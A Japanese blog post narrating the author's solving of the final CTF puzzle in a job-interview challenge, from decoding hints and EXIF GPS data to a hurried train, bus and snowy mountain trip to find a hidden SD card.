<iframe src="//www.slideshare.net/slideshow/embed_code/47019316" width="425" height="355" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe>


<p> <div style="margin-bottom:5px"> <strong> <a href="//www.slideshare.net/mzyy94/ctf-coinslt" title="CTFの話 - coinsLT #10" target="_blank">CTFの話 - coinsLT #10</a> </strong> from <strong><a href="//www.slideshare.net/mzyy94" target="_blank">Yuki Mizuno</a></strong> </div></p>

<p>この発表では、この記事の内容から抜粋する形で、最後のmondai10を解く楽しさと、それによって得た経験を紹介してきました。
よろしければご覧になってみてください。</p>

<p>さて、一昨々日から始まったネットエージェント最終面接問題のWrite-upもこれで最終回です。
<a href="http://mzyy94.com/blog/2015/04/15/netagent-mondai7-9/">昨日のmondai9のWrite-up</a>に続き、最後のmondai10のWrite-upです。</p>

<!-- more -->


<h1>mondai10</h1>

<p>mondai9でマウントしたmondai10.tcには9枚の写真とmondai10.txtがありました。mondai10.txtには以下のように記載がありました。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>関東２ヶ所、関西２ヶ所のそれぞれの箇所にSDカードに最後の問題を隠した。今までのヒントと写真から位置を割り出せ。
</span><span class='line'>
</span><span class='line'>各地先着１名
</span><span class='line'>ヒント：石の下のミンティア</span></code></pre></td></tr></table></div></figure>


<p>関東に住んでいるので、関東のSDカードをゲットしに行こうと思いました。
関東の2ヶ所はkanto1・kanto2と呼ばれ、どちらにしようか迷っていると、kanto2がゲットを狙われているとの情報を得たのでkanto1に行くことにしました。</p>

<h2>今までのヒント</h2>

<p>これまでの問題を解いていて、途中でhint[数字].txtといったファイルが幾つか一緒に出てきました。
このhintに書かれているkanto1のヒントは以下の6つでした。</p>

<ul>
<li>com.ruckygames.gunmaapps</li>
<li>ひもかわうどん</li>
<li>百足</li>
<li>×Fe</li>
<li>!△</li>
<li>ヤマヒゲナガケンミジンコ</li>
</ul>


<p>1つ目のヒントはアプリケーションBundle IDで、<strong>ぐんまのやぼう</strong>のものでした。2つ目のヒントのひもかわうどんは、群馬県の桐生名物とのことです。
この2つから群馬県のとある場所に隠されているということが想像つきます。</p>

<p>3つ目のヒントの百足と群馬県をセットにしてGoogle検索してみると、次のサイトが上位にヒットします。</p>

<p><a href="http://akagi-yama.jp/archives/358">神戦「赤城と日光二荒山神戦」 | 群馬県赤城山ポータルサイト</a></p>

<p>群馬県赤城山の神様が大ムカデとのことです。これによって群馬県赤城山に隠されている線が浮上します。</p>

<p>4つ目のヒントは×Fe（※エックスではなくバツ）ですが、さっぱりわかりません。そのまま見るに、鉄(Fe)ではない、ということでしょうか。</p>

<p>5つ目のヒントは!△で意味するところは、山頂にはない、もしくは、三角点付近ではない、ということでしょうか。これまたよくわかりません。</p>

<p>6つ目のヒントはヤマヒゲナガケンミジンコで、Google検索してみるとミジンコ画像サイトばかりヒットしてよくわかりませんでした。</p>

<p>これらのヒントを元にわかったことは、<strong>群馬県の赤城山</strong>に隠されているということです。
kanto1に関する画像がまだ確認してないので見てみます。
kanto1_1.jpgとkanto1_2.jpgのファイル情報に撮影場所の手がかりがあるかもと期待を込め、メタ情報を見てみます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/exif-infos.png" alt="exif-infos.png" /></p>

<p>予想通り、SDカードを隠した場所のGPSの座標情報がEXIFに含まれているようです。OS Xのプレビュー.appで詳細情報を開いて、マップ.appにその地点を表示させてみました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/apple-map.png" alt="apple-map.png" /></p>

<p>ヒントから導いた通り、隠されている場所は赤城山でまちがいないようです。</p>

<p>早速、赤城山への行き方を調べてみます。</p>

<p><a href="http://akagi-yama.jp/access">アクセス | 群馬県赤城山ポータルサイト</a></p>

<p>公共交通機関で行く方法として、電車に乗って前橋駅もしくは中央前橋駅へ行き、そこから赤城山行きのバスに乗ればよいと示されていました。
同じ関東だし翌日9時頃に家を出ればその日のうちに帰ってこれるだろ、と高を括り、お布団に入って熟睡し翌日に備えました。
今思えばこの時点で<strong>エクストリームCTF</strong>が始まっていました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>明日は10時頃大学行って11時ごろ電車乗って14時ごろ登山開始ってところかな（）</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584723697740582913">2015, 4月 5</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>ヤマノススメするぞといった気持ち</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584858646346989568">2015, 4月 5</a></blockquote>




<iframe src="http://rcm-fe.amazon-adsystem.com/e/cm?lt1=_blank&bc1=000000&IS2=1&bg1=FFFFFF&fc1=000000&lc1=0000FF&t=mzyy-22&o=9&p=8&l=as4&m=amazon&f=ifr&ref=ss_til&asins=B00L3NPW7E" style="width:120px;height:240px;" scrolling="no" marginwidth="0" marginheight="0" frameborder="0"></iframe>


<h2>当日</h2>

<p>ぐっすりと睡眠をとり、目覚めのコーヒーと朝食の調理パンを食べて赤城山に向かう準備を始めます。</p>

<blockquote class="twitter-tweet" lang="ja"><p>とりあえず登山グッズはこんなもんか <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/pXQj4G5MdH">pic.twitter.com/pXQj4G5MdH</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584861432895811585">2015, 4月 5</a></blockquote>


<p>MBA,パン,水分,チョコレート,革手袋,コンパクトダウンジャケット,モバイルバッテリーにSDカードリーダーを持っていざ出発です。</p>

<h3>午前の部　電車乗り換え編</h3>

<blockquote class="twitter-tweet" lang="ja"><p>行くぜ関東 <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ つくば駅 (Tsukuba Sta.) in つくば市, 茨城県) <a href="https://t.co/DUWnj3m167">https://t.co/DUWnj3m167</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584874102009266176">2015, 4月 6</a></blockquote>


<p>自宅の最寄駅のつくば駅からつくばエクスプレスに乗り、赤城山の最寄駅である前橋駅へ向かいます。
つくばエクスプレスの電車の中で検索したところ経路としては、流山おおたかの森駅乗り換えで東武鉄道を使う行き方と、
南流山乗り換えでJRを使って行く方法がありました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/train-connections.png" alt="train-connections" /></p>

<p>JRでは移動距離100km以上だったので学割が使えますが、電車内での決断は以下のようになりました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>JRでSDカード発掘に行くつもりだったけど時間ずらすと東武の方が安いことに気づいて学割使わなんだ</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584881057205395456">2015, 4月 6</a></blockquote>


<p>この時は後にある過酷な乗り換えが待っていることも知らず、運賃の安さで流山おおたかの森駅での乗り換えを選択しました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>TX乗り換え <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ つくばエクスプレス 流山おおたかの森駅 in 流山市, 千葉県) <a href="https://t.co/PTvNeocyiw">https://t.co/PTvNeocyiw</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584879354540388352">2015, 4月 6</a></blockquote>


<p>東武鉄道へと乗り換え、電車の中で前橋駅から赤城山へのバスの時刻表を調べ始めます。ここで衝撃の事実を知ることになります。</p>

<blockquote class="twitter-tweet" lang="ja"><p>やべぇ登山口へのバスの本数少なすぎるw <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584885349471498242">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>ちょっと！kanto1最寄り駅から1日5本しかバス出てないってどういうことおかしいでしょ！！ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584885739130716160">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>5本じゃない4本だし！！！ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584885923290030082">2015, 4月 6</a></blockquote>


<p>衝撃です。平日の前橋駅発赤城山行きのバスは4本しかなく、4本目が最終折り返し便という記載がバス時刻表にあることを初めて知りました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/bus-table.png" alt="bus-table" /></p>

<p>平日の前橋駅発富士見温泉経由赤城山行きの出発時刻は7:32、10:35、13:27、15:28の4本しかなく、15:28の便が最終折り返し便なので、なんとしてでも13:27のバスに乗らなければならない状況に立たされていることを知ります。
悠長に電車旅を続けられる状態ではなくなりました。本数の少ない路線を乗り継いでいるため、一つでも乗り換えを間違えたり間に合わなかったりすると13:27のバスに間に合わず、そこでmondai10へのチャレンジ終了となります。</p>

<p>ギリギリの乗り換えを迫られているがため、春日部駅で10:26発の久喜行きの電車が目の前で去った時は、乗り換え失敗をしたと勘違いし、焦ってこんなツイートをしていました（乗り換え案内によると10:36発の久喜行きに乗ればよいとのことでした）。</p>

<blockquote class="twitter-tweet" lang="ja"><p>あかん乗り換えミスったやばいぞ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 春日部駅 (Kasukabe Sta.) in 春日部市, 埼玉県) <a href="https://t.co/4d9tnWBHpQ">https://t.co/4d9tnWBHpQ</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584890215510192129">2015, 4月 6</a></blockquote>


<p>なんとか春日部駅での乗り換えを成功し、電車の中でこんなことを考えていました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>新幹線乗ればよかった感</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584891590436454400">2015, 4月 6</a></blockquote>


<p>運賃をできるだけ安く済ませようと、有料特急を乗り換え案内の検索条件から外していたのですが、埼玉県の大宮駅で新幹線に乗って群馬県の高崎駅へ行く経路をとれば、乗り換えも少なく、時間に余裕を持って前橋駅まで行くことができたのです。</p>

<p>続く2駅も、途中2分という短い乗り換え時間でありながらも、乗り遅れることなく無事乗り換えることに成功しました。</p>

<blockquote class="twitter-tweet" lang="ja"><p><a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 久喜駅 (Kuki Sta.) in 久喜市, 埼玉県) <a href="https://t.co/Xm0SXXYVs7">https://t.co/Xm0SXXYVs7</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584895933697159168">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>乗り換え可能時間2分しかないぞ</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584903863565594624">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>乗り換え成功 <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 館林駅 (Tatebayashi Sta.) in 館林市, 群馬県) <a href="https://t.co/zCyWnEyjHF">https://t.co/zCyWnEyjHF</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584905684585750528">2015, 4月 6</a></blockquote>


<p>さて、普通にプラットホームを移動して乗り換えするだけでよかったのはこの館林駅まで。次の乗り換え駅である足利市駅では時間との戦いが待っているのです。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/running-connection.png" alt="running-connection" /></p>

<p>足利市駅での乗り換えでは、違う路線の駅間を歩いて移動しなければならないのです。この乗り換えの最大の難関は移動時間。足利市駅に11:47に到着し足利駅の発車時刻は12:05で、その間の時間は18分しかありません。徒歩での経路をiOSのマップで調べてみると、予想所要時間は18分となっています。迷ったり道を間違えたりしていたら乗り損ねてしまい、mondai10チャレンジ終了となります。</p>

<blockquote class="twitter-tweet" lang="ja"><p>東武鉄道遅延情報出てないのに遅延してるクズっぽい</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584910433590517760">2015, 4月 6</a></blockquote>


<p>追い討ちをかけるように、東武鉄道は2分ほど足利市駅への到着が遅れていました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>駅間ダッシュだっ！ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 足利市駅 (Ashikagashi Sta.) in 足利市, 栃木県) <a href="https://t.co/nvG8VXUlrI">https://t.co/nvG8VXUlrI</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584910796683157504">2015, 4月 6</a></blockquote>


<p>11:49に駅に到着し、足利駅への移動を開始します。</p>

<blockquote class="twitter-tweet" lang="ja"><p>いきなり迷ってる <a href="https://twitter.com/hashtag/%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%88%E3%83%AA%E3%83%BC%E3%83%A0CTF?src=hash">#エクストリームCTF</a> <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584911355313917953">2015, 4月 6</a></blockquote>


<p>駅の出口が2方向にあり、どちらに出ればいいかわからず、さらに出口から出たところで道らしき道が見当たらなかったため、2分ほど迷ってしまいました。</p>

<p>iPhoneの電子コンパスを使って方角を確かめ、正しい出口から出てマップを頼りに急いで移動を開始します。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/connection-map.png" alt="connection-map" /></p>

<p>駅間の移動中の風景はとてものどかで、ゆっくりとした時間が流れているようでした。ゆっくりと時間が流れて欲しいと思っていたからかもしれませんが。
橋を渡っている時に撮った渡良瀬川の風景は、特に面白みがなく自然な感じでした。</p>

<blockquote class="twitter-tweet" lang="ja"><p><a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/v9Jca4uFE4">pic.twitter.com/v9Jca4uFE4</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584911834458689536">2015, 4月 6</a></blockquote>


<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2374.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2374_thumb.JPG" alt="IMG_2374.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2375.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2375_thumb.JPG" alt="IMG_2375.JPG" /></a></p>

<p>のんびりと写真を撮っていたからでしょうか、駅まで残り250mの地点ですでに電車出発まで残り2分を切ってしまいました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/last_250m.png" alt="last_250m" /></p>

<p>猛ダッシュするしかありません。幸い、信号のある道ではなかったので歩道を存分に走って駅に向かうことができました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>ギリッギリw <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 足利駅 (Ashikaga Sta.) in 足利市, 栃木県) <a href="https://t.co/tkic86CCmO">https://t.co/tkic86CCmO</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584914938298261504">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>最後猛ダッシュだったわw <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584915058506870784">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>あと30秒遅かったらリタイアだったわ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584915558820225025">2015, 4月 6</a></blockquote>


<p>駅の改札を通ると高崎行き方面のホームにはすでに電車が！ふくらはぎパンパンになりながらも階段を駆け上がり、なんとか電車に間に合い乗ることができました。</p>

<p>ちなみに足利駅には電車が飾ってありました。（こんなの撮影してないで急げというツッコミはなしで）</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2379.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2379_thumb.JPG" alt="IMG_2379.JPG" /></a></p>

<p>最後の乗り換えを終え、あとは前橋駅で降りるだけとなりました。なんとか電車で赤城山最寄駅までこぎつけることができる状態となり、これにて過酷な電車乗り換え編はおしまいとなります。</p>

<blockquote class="twitter-tweet" lang="ja"><p>とりあえず エクストリームCTF 午前の部 電車編 はクリアできたっぽいです</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584918614555238401">2015, 4月 6</a></blockquote>


<h3>昼の部　バス乗り換え編</h3>

<blockquote class="twitter-tweet" lang="ja"><p>エクストリームCTF 昼の部 バス編開始です <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 前橋駅 (Maebashi Sta.) in 前橋市, 群馬県) <a href="https://t.co/djgY3NCMZ9">https://t.co/djgY3NCMZ9</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584927608808288256">2015, 4月 6</a></blockquote>


<p>へとへとになりながらも降りそびれることなく、前橋駅に到着しました。</p>

<p>バスターミナルを回り、富士見温泉経由で赤城山に向かうバスを探します。</p>

<blockquote class="twitter-tweet" lang="ja"><p>この13:27で行けるはず… <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 前橋駅バスターミナル in 前橋市, 群馬県) <a href="https://t.co/zRGB3P2gof">https://t.co/zRGB3P2gof</a> <a href="http://t.co/utCcwl1PVN">pic.twitter.com/utCcwl1PVN</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584928918194540544">2015, 4月 6</a></blockquote>


<p>事前に（電車内で）調べてあった13:27発のバスがありました。しかし富士見温泉終点と書いてあるこのバスで本当に赤城山へ行けるか心配になり、バス案内所へ行きどの便でいけるのかを聞いてきました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>心配になってバス案内所で聞いてきたら13:27の便であってた <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/s2Hfmuv4Jc">pic.twitter.com/s2Hfmuv4Jc</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584931886155239425">2015, 4月 6</a></blockquote>


<p>この13:27発の電車であっていたようです。一度富士見温泉で赤城山ビジターセンター行きのバスに乗り換えをする必要があるとのことでした。</p>

<p>案内所にあったバス停の停車場所の地図から、SDカードがある場所に一番近いバス停を探します。Google Mapによると、赤城山ビジターセンターまで行ってしまうと大回りとなってしまうとのことで、その一つ前の赤城山大洞で降りると、山道を通って最短経路で行けるとのことでした。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/16/bus-stop-route.png" alt="bus-stop-route" /></p>

<p>時間になり、バスが来たので乗車しました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>バス乗った　<a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584934452813365248">2015, 4月 6</a></blockquote>


<p>ここで想定していなかった事態が発生します。</p>

<blockquote class="twitter-tweet" lang="ja"><p>雨降ってきたし！！！</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584934838643195904">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>雨降るなんて聞いてないよ！！！ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584934887217500160">2015, 4月 6</a></blockquote>


<p>天気予報では&#8221;晴れ&#8221;となっていたので雨具など用意していません。しかもバスに乗るまで20分ほど待ち時間があったので、乗車前に降りそうな予感がしていれば雨合羽を買うことすらできただけに、最悪のタイミングで雨が降ってきました。このままSDカードを見つけることができるのかと、とても不安になってきました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>まんがタイムきららのドキドキビジュアルコミックス以上にドキドキしてる</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584937029898612736">2015, 4月 6</a></blockquote>


<p>ぼーっと外を眺めていても、雨粒と曇天とでかい鳥居くらいしかなく、ぜんぜん落ち着きませんでした。</p>

<blockquote class="twitter-tweet" lang="ja"><p>でかい鳥居だ <a href="http://t.co/9xRZJc8ODm">pic.twitter.com/9xRZJc8ODm</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584941636108451840">2015, 4月 6</a></blockquote>


<p>そうこうしていると富士見温泉バス停に着き、乗り換えをしました。</p>

<blockquote class="twitter-tweet" lang="ja"><p><a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 富士見温泉バス停) <a href="https://t.co/NDft6XwqIr">https://t.co/NDft6XwqIr</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584943568017588224">2015, 4月 6</a></blockquote>


<p>赤城山ビジターセンター行きのバスに乗ると、風景に大きな山が見えてきました。たぶん赤城山です。たぶん。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2388.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2388_thumb.JPG" alt="IMG_2388.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2391.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2391_thumb.JPG" alt="IMG_2391.JPG" /></a></p>

<p>バスで揺られて眠くなる中、標高1000mを越えたあたりから車窓から覗く景色が明るくなっていることに気づきます。</p>

<blockquote class="twitter-tweet" lang="ja"><p>標高1000m超えた</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584950108011110400">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>残雪があるぞ…</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584951262354939905">2015, 4月 6</a></blockquote>


<p>そう、残雪が景色を明るくしていたのです。また、赤城山大沼という湖は湖面が凍っていました。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2395.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2395_thumb.JPG" alt="IMG_2395.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2398.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2398_thumb.JPG" alt="IMG_2398.JPG" /></a></p>

<p>赤城山大洞バス停に到着し、降車します。降りるとき、バスの運転手にこう告げられました。</p>

<blockquote><p>バス停が雪に埋まってるから帰りは降りた位置辺りにいれば止まるよ</p></blockquote>

<p>嫌な予感しかしません。</p>

<p>ここから想像をはるかに超える過酷な登山が始まります。</p>

<h3>午後1　登山編</h3>

<blockquote class="twitter-tweet" lang="ja"><p>さぁ、登山開始だ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> (@ 赤城山第1スキー場 in 前橋市, 群馬県) <a href="https://t.co/tHRXadHe4S">https://t.co/tHRXadHe4S</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584954825294684160">2015, 4月 6</a></blockquote>


<p>バス停を降りてすぐのところで登山者向けの案内看板を見つけました。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2399.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2399_thumb.JPG" alt="IMG_2399.JPG" /></a></p>

<p>この看板の略図にある地蔵岳を越えてゆくコースを通ってSDカードの場所へと向かいます。看板の凡例にあるように、通る道は<strong>歩道</strong>となっているので比較的楽に登ることができると思いまいした。その歩道とやらはどこにあるのかとあたりを見渡すと、アスファルトで舗装された道がみつかりました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>どうすんだよこれ <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/3DeQWYKK8V">pic.twitter.com/3DeQWYKK8V</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584955092714950656">2015, 4月 6</a></blockquote>


<p>かろうじてアスファルトの道であるとわかる雪に覆われた登山道を見つけます。100mほど先を見ると、アスファルトはすべて雪に覆われ見えなくなっています。
完全に想像していなかった事態です。春になり暖かくなってきていたので、こんなにも雪が積もっているなんて考えていませんでした。
出発前の甘い考えがここで思い出されます。</p>

<blockquote class="twitter-tweet" lang="ja"><p>ヤマノススメするぞといった気持ち</p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584858646346989568">2015, 4月 5</a></blockquote>




<iframe src="http://rcm-fe.amazon-adsystem.com/e/cm?lt1=_blank&bc1=000000&IS2=1&bg1=FFFFFF&fc1=000000&lc1=0000FF&t=mzyy-22&o=9&p=8&l=as4&m=amazon&f=ifr&ref=ss_til&asins=B00L3NPW7E" style="width:120px;height:240px;" scrolling="no" marginwidth="0" marginheight="0" frameborder="0"></iframe>


<p>何も下調べせずに来てしまったことを強く後悔しました。
事前にしっかりと下調べしていれば、1800m超級の山にはまだ雪が残っているというのは安易に想像がつきます。小爪アイゼン装備のブーツを持ってくることもできたのです。</p>

<p>よく滑る雪道を数十メートル進み、湖の方を眺めると大きな山がこちらを見守ってくれていました。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2403.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2403_thumb.JPG" alt="IMG_2403.JPG" /></a></p>

<p>刻々と帰りのバスの時間が迫ってきているので、後悔はほどほどに先に進みます。</p>

<blockquote class="twitter-tweet" lang="ja"><p>やばい(確信) <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/NsTmOr6ZL2">pic.twitter.com/NsTmOr6ZL2</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584956357419241472">2015, 4月 6</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>なんで沢登りせにゃならんのだw <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/5c72fEWBQc">pic.twitter.com/5c72fEWBQc</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584958094637015040">2015, 4月 6</a></blockquote>


<p>膝上まで沈む深い雪があるところや、雪解け水で小川ができているところを水浸しになりながらかけ進んでいきます。</p>

<p><a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2405.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2405_thumb.JPG" alt="IMG_2405.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2410.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2410_thumb.JPG" alt="IMG_2410.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2412.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2412_thumb.JPG" alt="IMG_2412.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2413.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2413_thumb.JPG" alt="IMG_2413.JPG" /></a>
<a href="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2414.JPG"><img src="http://mzyy94.com/blog/resources/images/2015/04/16/IMG_2414_thumb.JPG" alt="IMG_2414.JPG" /></a></p>

<blockquote class="twitter-tweet" lang="ja"><p>Googleさんの案内相当険しかったですね。。これマップの地点の画像です <a href="https://twitter.com/hashtag/SDcardFindingBattle?src=hash">#SDcardFindingBattle</a> <a href="http://t.co/OthdUPcczu">pic.twitter.com/OthdUPcczu</a></p>&mdash; えびと犬と柚子胡椒みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/584976426962530305">2015, 4月 6</a></blockquote>


<p>20分ほど登ったでしょうか、地蔵岳の登山道を抜け、車道に出てきました。</p>

